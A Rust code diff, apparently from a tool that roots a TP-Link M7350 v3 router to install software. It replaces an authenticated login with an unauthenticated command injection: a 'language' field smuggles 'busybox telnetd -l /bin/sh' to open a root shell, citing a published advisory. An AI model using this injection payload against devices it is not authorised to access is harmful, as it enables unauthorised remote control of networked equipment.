@@ -4,7 +4,6 @@ use std::time::Duration;
 
 use anyhow::{Context, Error};
 use serde::Deserialize;
-use serde_json::json;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::{sleep, timeout};
@@ -14,68 +13,31 @@ use crate::InstallTpLink;
 pub async fn main_tplink(args: InstallTpLink) -> Result<(), Error> {
     let InstallTpLink {
         skip_sdcard,
-        username,
-        password,
         admin_ip,
     } = args;
 
-    let qcmap_auth_endpoint = format!("http://{admin_ip}/cgi-bin/qcmap_auth");
     let qcmap_web_cgi_endpoint = format!("http://{admin_ip}/cgi-bin/qcmap_web_cgi");
-
-    #[derive(Deserialize)]
-    struct NonceResponse {
-        nonce: String,
-    }
-
     let client = reqwest::Client::new();
 
-    let NonceResponse { nonce } = client
-        .post(&qcmap_auth_endpoint)
-        .body(r#"{"module":"authenticator","action":0}"#)
-        .send()
-        .await?
-        .error_for_status()?
-        .json()
-        .await?;
-
-    println!("Successfully detected TP-Link M7350 v3, nonce: {nonce}");
-
-    let digest_md5 = md5::compute(format!("{username}:{password}:{nonce}").as_bytes());
-
     #[derive(Deserialize)]
-    struct TokenResponse {
-        token: String,
+    struct RootResponse {
+        result: u64,
     }
 
-    let TokenResponse { token } = client
-        .post(&qcmap_auth_endpoint)
-        .json(&json!({
-            "module": "authenticator",
-            "action": 1,
-            "digest": format!("{:x}", digest_md5)
-        }))
+    println!("Launching telnet on the device");
+
+    // https://github.com/advisories/GHSA-ffwq-9r7p-3j6r
+    // in particular: https://www.yuque.com/docs/share/fca60ef9-e5a4-462a-a984-61def4c9b132
+    let RootResponse { result } = client.post(&qcmap_web_cgi_endpoint)
+        .body(r#"{"module": "webServer", "action": 1, "language": "EN';echo $(busybox telnetd -l /bin/sh);echo 1'"}"#)
         .send()
         .await?
         .error_for_status()?
         .json()
         .await?;
 
-    println!("Got token: {token}");
-
-    for language in &["$(busybox telnetd -l /bin/sh)", "en"] {
-        println!("Setting language of device to {language}");
-        client
-            .post(&qcmap_web_cgi_endpoint)
-            .header("Cookie", format!("tpweb_token={token}"))
-            .json(&json!({
-                "token": token,
-                "module": "webServer",
-                "action": 1,
-                "language": language
-            }))
-            .send()
-            .await?
-            .error_for_status()?;
+    if result != 0 {
+        anyhow::bail!("Bad result code when trying to root device: {result}");
     }
 
     println!("Connecting via telnet to {admin_ip}");
